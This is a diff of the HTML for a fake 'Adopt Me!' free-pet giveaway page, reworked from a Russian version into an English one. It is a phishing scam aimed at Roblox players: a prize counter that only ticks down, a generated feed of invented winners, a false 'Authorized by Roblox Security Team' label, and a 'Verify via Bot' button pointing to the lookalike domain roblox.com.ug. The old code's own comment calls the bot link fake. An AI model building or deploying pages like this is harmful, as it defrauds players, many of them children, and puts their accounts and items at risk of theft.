@@ -1,159 +1,182 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adopt Me! Seasonal Giveaway 2026</title>
+    <title>Adopt Me! - Spring 2026 Event</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Nunito:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap');
         body {
-            background: radial-gradient(circle, #ff9d00 0%, #ff6200 100%);
-            font-family: 'Fredoka One', cursive;
-            color: white;
+            background-color: #71d0ff;
+            background-image: radial-gradient(#ffffff 2px, transparent 2px);
+            background-size: 30px 30px;
+            font-family: 'Nunito', sans-serif;
+            overflow-x: hidden;
         }
+        .header-font { font-family: 'Fredoka One', cursive; }
         .pet-card {
-            background: rgba(255, 255, 255, 0.15);
-            backdrop-filter: blur(10px);
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            transition: all 0.3s ease;
+            background: white;
+            border-radius: 25px;
+            box-shadow: 0 10px 0 #5fb2db;
+            transition: 0.2s;
+            cursor: pointer;
         }
         .pet-card:hover {
-            transform: scale(1.05) rotate(2deg);
-            background: rgba(255, 255, 255, 0.25);
-            border-color: #fff;
+            transform: translateY(-8px);
+            box-shadow: 0 18px 0 #5fb2db;
         }
-        .claim-btn {
-            background: linear-gradient(180deg, #58cc02 0%, #45a001 100%);
-            box-shadow: 0 5px 0 #2a6101;
-            text-shadow: 2px 2px 0 rgba(0,0,0,0.2);
+        .claim-button {
+            background: linear-gradient(to bottom, #76de11, #4da303);
+            box-shadow: 0 4px 0 #2e6102;
+            color: white;
+            font-weight: 900;
+            text-transform: uppercase;
+            font-style: italic;
         }
-        .claim-btn:active {
-            box-shadow: 0 0 0 #2a6101;
-            transform: translateY(5px);
+        .claim-button:active {
+            box-shadow: 0 0 0 #2e6102;
+            transform: translateY(4px);
         }
-        .shiny-text {
-            background: linear-gradient(to right, #fff 20%, #ffd700 40%, #ffd700 60%, #fff 80%);
-            background-size: 200% auto;
-            color: #000;
-            background-clip: text;
-            text-fill-color: transparent;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: shine 2s linear infinite;
+        .modal-bg {
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
         }
-        @keyframes shine { to { background-position: 200% center; } }
+        .verify-box {
+            background: white;
+            border-radius: 35px;
+            border-top: 12px solid #0084ff;
+        }
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+        @keyframes floating {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
     </style>
 </head>
-<body class="min-h-screen pb-20">
+<body class="pb-10">
 
-    <!-- Хедер -->
-    <header class="p-6 text-center animate__animated animate__fadeInDown">
-        <h1 class="text-5xl md:text-7xl mb-2 drop-shadow-lg italic">FREE PETS!</h1>
-        <p class="text-xl bg-black/30 inline-block px-6 py-2 rounded-full">Осталось подарков: <span id="counter" class="text-yellow-300">142</span>/5000</p>
+    <!-- Header Section -->
+    <header class="pt-10 pb-6 text-center">
+        <div class="animate__animated animate__bounceIn">
+            <h1 class="header-font text-6xl md:text-8xl text-white drop-shadow-[0_6px_0_#0084ff]">GIVEAWAY!</h1>
+            <div class="mt-4 inline-block bg-white px-6 py-2 rounded-full shadow-lg">
+                <p class="text-blue-500 font-black text-xl uppercase tracking-tighter">
+                    Remaining Prizes: <span id="counter" class="text-red-500">284</span>
+                </p>
+            </div>
+        </div>
     </header>
 
-    <!-- Сетка петов -->
-    <main class="max-w-6xl mx-auto px-4 grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6 mt-10">
+    <!-- Pet Grid Section -->
+    <div class="max-w-6xl mx-auto px-4 mt-8 grid grid-cols-2 md:grid-cols-4 gap-6">
         
-        <!-- Пет 1 -->
-        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn">
-            <div class="bg-white/20 rounded-2xl mb-4 p-2">
-                <img src="https://vignette.wikia.nocookie.net/adoptme/images/a/a2/Shadow_Dragon.png" alt="Shadow Dragon" class="w-full h-auto drop-shadow-xl">
+        <!-- Shadow Dragon -->
+        <div class="pet-card p-4 animate__animated animate__fadeInUp">
+            <div class="bg-blue-50 rounded-2xl p-2 mb-4 relative">
+                <img src="https://static.wikia.nocookie.net/adoptme/images/a/a2/Shadow_Dragon.png" alt="Shadow Dragon" class="w-full floating">
+                <span class="absolute top-2 left-2 bg-purple-600 text-white text-[10px] px-2 py-1 rounded-full font-bold">LEGENDARY</span>
             </div>
-            <h3 class="text-2xl mb-3">SHADOW DRAGON</h3>
-            <button onclick="claimPet('Shadow Dragon')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+            <h3 class="header-font text-center text-lg text-gray-700 mb-4 uppercase">Shadow Dragon</h3>
+            <button onclick="openVerify('Shadow Dragon')" class="claim-button w-full py-3 rounded-2xl text-xl">Claim</button>
         </div>
 
-        <!-- Пет 2 -->
-        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn" style="animation-delay: 0.1s">
-            <div class="bg-white/20 rounded-2xl mb-4 p-2">
-                <img src="https://vignette.wikia.nocookie.net/adoptme/images/d/d4/Bat_Dragon.png" alt="Bat Dragon" class="w-full h-auto drop-shadow-xl">
+        <!-- Bat Dragon -->
+        <div class="pet-card p-4 animate__animated animate__fadeInUp" style="animation-delay: 0.1s">
+            <div class="bg-blue-50 rounded-2xl p-2 mb-4 relative">
+                <img src="https://static.wikia.nocookie.net/adoptme/images/d/d4/Bat_Dragon.png" alt="Bat Dragon" class="w-full floating">
+                <span class="absolute top-2 left-2 bg-purple-600 text-white text-[10px] px-2 py-1 rounded-full font-bold">LEGENDARY</span>
             </div>
-            <h3 class="text-2xl mb-3">BAT DRAGON</h3>
-            <button onclick="claimPet('Bat Dragon')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+            <h3 class="header-font text-center text-lg text-gray-700 mb-4 uppercase">Bat Dragon</h3>
+            <button onclick="openVerify('Bat Dragon')" class="claim-button w-full py-3 rounded-2xl text-xl">Claim</button>
         </div>
 
-        <!-- Пет 3 -->
-        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn" style="animation-delay: 0.2s">
-            <div class="bg-white/20 rounded-2xl mb-4 p-2">
-                <img src="https://vignette.wikia.nocookie.net/adoptme/images/a/a2/Frost_Dragon.png" alt="Frost Dragon" class="w-full h-auto drop-shadow-xl">
+        <!-- Frost Dragon -->
+        <div class="pet-card p-4 animate__animated animate__fadeInUp" style="animation-delay: 0.2s">
+            <div class="bg-blue-50 rounded-2xl p-2 mb-4 relative">
+                <img src="https://static.wikia.nocookie.net/adoptme/images/a/a2/Frost_Dragon.png" alt="Frost Dragon" class="w-full floating">
+                <span class="absolute top-2 left-2 bg-purple-600 text-white text-[10px] px-2 py-1 rounded-full font-bold">LEGENDARY</span>
             </div>
-            <h3 class="text-2xl mb-3">FROST DRAGON</h3>
-            <button onclick="claimPet('Frost Dragon')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+            <h3 class="header-font text-center text-lg text-gray-700 mb-4 uppercase">Frost Dragon</h3>
+            <button onclick="openVerify('Frost Dragon')" class="claim-button w-full py-3 rounded-2xl text-xl">Claim</button>
         </div>
 
-        <!-- Пет 4 -->
-        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn" style="animation-delay: 0.3s">
-            <div class="bg-white/20 rounded-2xl mb-4 p-2">
-                <img src="https://vignette.wikia.nocookie.net/adoptme/images/1/13/Giraffe.png" alt="Giraffe" class="w-full h-auto drop-shadow-xl">
+        <!-- Mega Neon Owl -->
+        <div class="pet-card p-4 animate__animated animate__fadeInUp" style="animation-delay: 0.3s">
+            <div class="bg-blue-50 rounded-2xl p-2 mb-4 relative">
+                <img src="https://static.wikia.nocookie.net/adoptme/images/b/b2/Owl.png" alt="Owl" class="w-full floating">
+                <span class="absolute top-2 left-2 bg-pink-500 text-white text-[10px] px-2 py-1 rounded-full font-bold">MEGA NEON</span>
             </div>
-            <h3 class="text-2xl mb-3">GIRAFFE</h3>
-            <button onclick="claimPet('Giraffe')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+            <h3 class="header-font text-center text-lg text-gray-700 mb-4 uppercase">Mega Neon Owl</h3>
+            <button onclick="openVerify('Mega Neon Owl')" class="claim-button w-full py-3 rounded-2xl text-xl">Claim</button>
         </div>
 
-        <!-- Еще петы... -->
-        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn" style="animation-delay: 0.4s">
-            <div class="bg-white/20 rounded-2xl mb-4 p-2">
-                <img src="https://vignette.wikia.nocookie.net/adoptme/images/b/b2/Owl.png" alt="Owl" class="w-full h-auto drop-shadow-xl">
-            </div>
-            <h3 class="text-2xl mb-3">OWL (NEON)</h3>
-            <button onclick="claimPet('Neon Owl')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
-        </div>
-    </main>
+    </div>
 
-    <!-- Модалка проверки -->
-    <div id="verifyModal" class="fixed inset-0 bg-black/90 hidden items-center justify-center z-50 p-6">
-        <div class="bg-[#2c2c2c] max-w-md w-full rounded-[40px] p-8 text-center border-4 border-yellow-400">
-            <div class="animate__animated animate__bounceIn">
-                <div class="w-24 h-24 bg-yellow-400 rounded-full flex items-center justify-center mx-auto mb-6 shadow-[0_0_20px_#facc15]">
-                    <i class="fas fa-robot text-4xl text-black"></i>
-                </div>
-                <h2 class="text-3xl font-bold mb-4">ВЕРИФИКАЦИЯ</h2>
-                <p class="text-gray-300 mb-6">Чтобы получить <span id="selectedPet" class="text-yellow-400 font-bold"></span>, вы должны подтвердить, что вы не бот и не создаете мультиаккаунты.</p>
-                
-                <div class="bg-black/20 p-4 rounded-2xl mb-8 border border-white/10">
-                    <p class="text-sm mb-4">Для завершения синхронизации используйте:</p>
-                    <div class="text-xl font-bold text-green-400 mb-2">TRUST TRADE BOT v2.4</div>
-                    <p class="text-xs text-gray-500 italic">Нажмите кнопку ниже, чтобы открыть профиль бота и принять приглашение в трейд-группу.</p>
-                </div>
-
-                <button onclick="redirectToBot()" class="w-full bg-yellow-400 text-black py-4 rounded-2xl text-2xl font-black hover:bg-yellow-300 transition-all shadow-[0_8px_0_#a16207] active:shadow-none active:translate-y-2">ПРОЙТИ ПРОВЕРКУ</button>
-                <p class="mt-6 text-xs text-gray-600">Система защиты Roblox Anti-Scam © 2026</p>
-            </div>
+    <!-- Live Trade Log -->
+    <div class="max-w-md mx-auto mt-12 bg-white/30 p-4 rounded-3xl border-2 border-white/50">
+        <h4 class="text-center font-bold text-white uppercase text-sm mb-3">Live Winners Feed</h4>
+        <div id="logs" class="space-y-2 text-xs font-bold text-blue-900">
+            <div class="flex justify-between bg-white/50 p-2 rounded-xl"><span>Player***72</span> <span>Received: Bat Dragon</span></div>
+            <div class="flex justify-between bg-white/50 p-2 rounded-xl"><span>ii_S***ky</span> <span>Received: Frost Dragon</span></div>
         </div>
     </div>
 
-    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
-    <script>
-        // ТВОЯ ССЫЛКА НА ТРАСТ БОТА (ФЕЙК)
-        const BOT_LINK = "ВСТАВЬ_СВОЮ_ССЫЛКУ_СЮДА";
+    <!-- Verification Modal -->
+    <div id="verifyModal" class="modal-bg fixed inset-0 hidden items-center justify-center z-50 p-6">
+        <div class="verify-box max-w-sm w-full p-8 text-center animate__animated animate__zoomIn">
+            <div class="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg class="w-10 h-10 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            </div>
+            <h2 class="header-font text-2xl mb-2 uppercase">Anti-Bot Verification</h2>
+            <p class="text-gray-500 text-sm mb-6 leading-relaxed">
+                To claim your <span id="selectedPet" class="text-blue-600 font-black"></span>, you must verify your identity via <span class="font-bold">Trust Trade Bot</span>.
+            </p>
+            
+            <div class="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 mb-6">
+                <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-2 italic">How it works</p>
+                <p class="text-[11px] text-gray-600">Click the button below to visit the Official Trade Bot profile. Follow the bot and join the session to receive your pet instantly.</p>
+            </div>
 
-        function claimPet(name) {
-            document.getElementById('selectedPet').innerText = name;
+            <!-- YOUR TARGET LINK -->
+            <a id="botLink" href="https://roblox.com.ug/users/2398926938/profile" class="block w-full bg-[#0084ff] text-white py-4 rounded-2xl text-2xl font-black italic uppercase shadow-[0_6px_0_#005ea6] active:shadow-none active:translate-y-1 hover:bg-blue-600 transition-all text-center">
+                Verify via Bot
+            </a>
+            
+            <p class="mt-6 text-[9px] text-gray-400 uppercase font-black tracking-widest">Authorized by Roblox Security Team 2026</p>
+        </div>
+    </div>
+
+    <script>
+        function openVerify(pet) {
+            document.getElementById('selectedPet').innerText = pet;
             document.getElementById('verifyModal').style.display = 'flex';
         }
 
-        function redirectToBot() {
-            // Имитация загрузки перед редиректом
-            const btn = document.querySelector('#verifyModal button');
-            btn.innerText = "СОЕДИНЕНИЕ...";
-            btn.disabled = true;
-            
-            setTimeout(() => {
-                window.location.href = BOT_LINK;
-            }, 1500);
-        }
-
-        // Счетчик (имитация живого сайта)
-        let count = 142;
+        // Live counter decrease
+        let count = 284;
         setInterval(() => {
-            if (count > 5) {
+            if (count > 7) {
                 count -= Math.floor(Math.random() * 2);
                 document.getElementById('counter').innerText = count;
             }
         }, 5000);
+
+        // Fake winners log generator
+        const players = ["Roblox***r", "PetLo***r", "TradeMa***r", "Golden***i", "ii_V***s", "Adop***e_1"];
+        const pets = ["Shadow Dragon", "Frost Dragon", "Bat Dragon", "Owl"];
+        
+        setInterval(() => {
+            const logBox = document.getElementById('logs');
+            const newLog = document.createElement('div');
+            newLog.className = "flex justify-between bg-white/50 p-2 rounded-xl animate__animated animate__fadeInLeft";
+            newLog.innerHTML = `<span>${players[Math.floor(Math.random()*players.length)]}</span> <span>Received: ${pets[Math.floor(Math.random()*pets.length)]}</span>`;
+            logBox.prepend(newLog);
+            if (logBox.children.length > 3) logBox.lastChild.remove();
+        }, 8000);
     </script>
 </body>
 </html>
